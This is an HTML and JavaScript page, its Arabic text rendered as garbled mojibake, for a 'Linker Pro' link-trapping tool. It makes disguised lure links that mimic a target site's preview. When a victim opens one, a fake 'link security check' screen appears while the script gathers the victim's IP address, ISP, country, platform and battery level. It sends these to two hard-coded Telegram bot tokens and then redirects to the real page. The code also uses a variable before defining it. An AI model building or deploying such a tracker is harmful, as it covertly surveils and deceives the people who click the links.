<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linker Pro v4 | Ù†Ø¸Ø§Ù… Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00d2ff; --bg: #0f172a; --card: #1e293b; }
        body { font-family: 'Cairo', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 450px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
        .gear { font-size: 60px; animation: spin 2s linear infinite; display: inline-block; color: var(--primary); }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; margin-bottom: 20px; outline: none; box-sizing: border-box; }
        button { background: linear-gradient(135deg, var(--primary), #3a7bd5); border: none; padding: 15px; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; width: 100%; }
        #result-box { display: none; margin-top: 20px; border: 2px dashed var(--primary); padding: 15px; border-radius: 10px; word-break: break-all; }
    </style>
</head>
<body>

<div class="container" id="main-container">
    <div id="generator-view">
        <h1 style="color: var(--primary);">Linker Pro ğŸ”—</h1>
        <p>Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø±Ø§Ø¯ ØªÙ„ØºÙŠÙ…Ù‡:</p>
        <input type="text" id="targetUrl" placeholder="https://example.com">
        <button id="genBtn">ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆØ­Ù‚Ù† Ø§Ù„Ø³ÙƒØ±Ø¨Øª âš™ï¸</button>
        <div id="result-box">
            <p>âœ… ØªÙ… Ø§Ù„ØªÙ„ØºÙŠÙ…! Ø§Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·:</p>
            <code id="final-link" style="background: #000; padding: 10px; display: block; border-radius: 5px; font-size: 11px;"></code>
        </div>
    </div>
</div>

<script>
    // 1. Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø³ØªÙ„Ù…ÙŠÙ† (Ø§Ù„ØªÙˆÙƒÙ† Ùˆ Ø§Ù„Ù€ ID Ù„ÙƒÙ„ Ø­Ø³Ø§Ø¨)
    const recipients = [
        { token: "8522437337:AAHwqXJjBqbbTL-QDbQoV7eoHp6fWFkopno", chat_id: "6068331455" },
        { token: "8594996038:AAEb5I-j5t8fp7GPIuyAlV4Z-irdKf2Nm7w", chat_id: "6194281534" }
    ];

    // --- Ø£ÙˆÙ„Ø§Ù‹: Ø¬Ø²Ø¡ ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· (ÙŠØ¹Ù…Ù„ Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø±) ---
    document.getElementById('genBtn')?.addEventListener('click', async function() {
        const urlInput = document.getElementById('targetUrl').value;
        if (!urlInput.startsWith('http')) return alert("Ø£Ø¯Ø®Ù„ Ø±Ø§Ø¨Ø·Ø§Ù‹ ØµØ­ÙŠØ­Ø§Ù‹");

        this.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ„ØºÙŠÙ…...";
        const proxy = "https://corsproxy.io/?"; 
        
        try {
            const response = await fetch(proxy + encodeURIComponent(urlInput));
            const htmlText = await response.text();
            const doc = new DOMParser().parseFromString(htmlText, "text/html");
            const title = doc.querySelector('meta[property="og:title"]')?.content || doc.title || "Ø±Ø§Ø¨Ø· Ù…Ø¤Ù…Ù†";
            const image = doc.querySelector('meta[property="og:image"]')?.content || "";

            const currentUrl = window.location.href.split('?')[0];
            const finalLink = `${currentUrl}?t=${encodeURIComponent(title)}&i=${encodeURIComponent(image)}&dest=${encodeURIComponent(urlInput)}`;

            document.getElementById('result-box').style.display = 'block';
            document.getElementById('final-link').innerText = finalLink;
            this.innerText = "ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¢Ù† âš™ï¸";
        } catch (e) { 
            alert("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø®Ø§Ø¯Ù…"); 
            this.innerText = "ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¢Ù† âš™ï¸";
        }
    });

    // --- Ø«Ø§Ù†ÙŠØ§Ù‹: Ø¬Ø²Ø¡ "Ø§Ù„ØªÙ„ØºÙŠÙ…" ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ (ÙŠØ¹Ù…Ù„ Ø¹Ù†Ø¯ ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ„Ø¯) ---
    async function startCapture() {
        const params = new URLSearchParams(window.location.search);
        if (!params.has('dest')) return;

        // Ø¥Ø®ÙØ§Ø¡ ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…ÙˆÙ„Ø¯ ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© Ø§Ù„ØªÙ…ÙˆÙŠÙ‡ Ù„Ù„Ù‡Ø¯Ù
        document.getElementById('main-container').innerHTML = `
            <div class="gear">âš™ï¸</div>
            <h2 style="color:var(--primary)">Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø£Ù…Ø§Ù† Ø§Ù„Ø±Ø§Ø¨Ø·...</h2>
            <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±ØŒ ÙŠØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ´ÙÙŠØ±</p>
        `;

        try {
            const port = window.location.port || "Ø§ÙØªØ±Ø§Ø¶ÙŠ (80/443)";
const isp = ipData.org || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

            // Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            let batteryLevel = "ØºÙŠØ± Ù…ØªØ§Ø­";
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryLevel = Math.floor(battery.level * 100) + "%";
            }

            // ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
            const message = `
â›”ï¸ *ØªÙ†Ø¨ÙŠÙ‡: Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯*
---------------------------------------
ğŸ”Œ *Ø§Ù„Ù…Ù†ÙØ°:* ${port}
ğŸ“¡ *Ø§Ù„Ù…Ø²ÙˆØ¯:* ${isp}
ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:* ${batteryLevel}
â° *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-EG')}
ğŸ’» *Ø§Ù„Ù†Ø¸Ø§Ù…:* ${navigator.platform}
ğŸŒ *IP:* ${ipData.ip}
ğŸŒ *Ø§Ù„Ø¯ÙˆÙ„Ø©:* ${ipData.country_name}
ğŸ¯ *Ø§Ù„ÙˆØ¬Ù‡Ø©:* ${params.get('dest')}
            `;

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„ÙƒÙ„ Ù…Ø³ØªÙ„Ù… ğŸ“¬
            for (const target of recipients) {
                const telegramUrl = `https://api.telegram.org/bot${target.token}/sendMessage?chat_id=${target.chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                await fetch(telegramUrl).catch(err => console.log("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø­Ø¯Ø¯"));
            }

            // Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ù„Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø£ØµÙ„ÙŠ
            setTimeout(() => {
                window.location.href = params.get('dest');
            }, 3000);

        } catch (error) {
            window.location.href = params.get('dest');
        }
    }

    // ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¯Ø§Ù„Ø© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    startCapture();
</script>

</body>
</html>
